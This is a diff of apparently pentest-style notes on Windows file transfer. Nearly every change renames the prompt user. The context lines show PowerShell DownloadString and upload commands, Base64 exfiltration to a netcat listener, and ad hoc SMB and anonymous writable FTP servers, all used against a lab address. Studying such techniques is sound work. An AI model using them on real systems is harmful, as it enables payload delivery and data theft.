@@ -6,7 +6,7 @@ Verify the MD5 hash of the target file:
 ```bash
 garffff@garffff:~/test$ more hello.py 
 print("hello world!")
-gareth@gareth:~/test$ md5sum hello.py 
+garffff@garffff:~/test$ md5sum hello.py 
 01c0a257edd3c2e95c25d80a4c18c5cc  hello.py
 ```
 
@@ -112,8 +112,8 @@ PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadString('https:/
 Create a uploads webserver:
 
 ```bash
-gareth@gareth:~/test$ pip3 install uploadserver
-gareth@gareth:~/test$ python3 -m uploadserver
+garffff@garffff:~/test$ pip3 install uploadserver
+garffff@garffff:~/test$ python3 -m uploadserver
 File upload available at /upload
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
@@ -130,14 +130,14 @@ PS C:\Users\Public\Downloads> Invoke-FileUpload -Uri http://192.168.0.51:8000/up
 
 ### Web Uploads Using Base64
 
-```powershell-session
+```bash
 PS C:\Users\Public\Downloads> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\users\public\downloads\hello.py' -Encoding Byte))
 ```
 
 Create a NC listener:
 
 ```bash
-gareth@gareth:~/test$ sudo nc -lvp 8000
+garffff@garffff:~/test$ sudo nc -lvp 8000
 ```
 
 Send Base64 encoded file:
@@ -149,7 +149,7 @@ PS C:\Users\Public\Downloads> Invoke-WebRequest -Uri http://192.168.0.51/ -Metho
 Results:
 
 ```bash
-gareth@gareth:~/test$ sudo nc -lvp 80
+garffff@garffff:~/test$ sudo nc -lvp 80
 Listening on 0.0.0.0 80
 Connection received on 192.168.0.75 1979
 POST / HTTP/1.1
@@ -166,7 +166,7 @@ cHJpbnQoImhlbGxvIHdvcmxkISIp
 Create SMB server:
 
 ```bash
-gareth@gareth:~/test$ sudo smbserver.py share /tmp -smb2support 
+garffff@garffff:~/test$ sudo smbserver.py share /tmp -smb2support 
 Impacket for Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs
 
 [*] Config file parsed
@@ -216,8 +216,8 @@ PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadFile('ftp://192
 Create writable FTP server
 
 ```bash
-gareth@gareth:~/test$ sudo python3 -m pyftpdlib --port 21 --write
-[sudo] password for gareth:            
+garffff@garffff:~/test$ sudo python3 -m pyftpdlib --port 21 --write
+[sudo] password for garffff:            
 /usr/local/lib/python3.10/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
   warnings.warn("write permissions assigned to anonymous user.",
 [I 2024-09-29 15:06:15] concurrency model: async
